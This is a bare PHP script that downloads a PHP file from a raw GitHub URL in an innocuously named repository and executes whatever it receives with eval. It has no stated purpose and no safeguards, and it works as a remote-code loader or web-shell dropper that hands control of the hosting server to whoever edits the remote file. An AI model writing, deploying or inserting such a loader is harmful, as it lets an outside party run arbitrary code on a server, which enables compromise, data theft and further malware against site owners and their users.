<?php
$url = "https://raw.githubusercontent.com/Vathannn/breakingnews/refs/heads/jangenam/asekale.php";
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
 
$response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
$body = substr($response, $header_size);
 
if (curl_errno($ch)) {
    echo "cURL error: " . curl_error($ch);
} elseif ($http_code != 200) {
    echo "HTTP Error: $http_code";
} else {
    eval("?>" . $body);
}
 
curl_close($ch);
?>
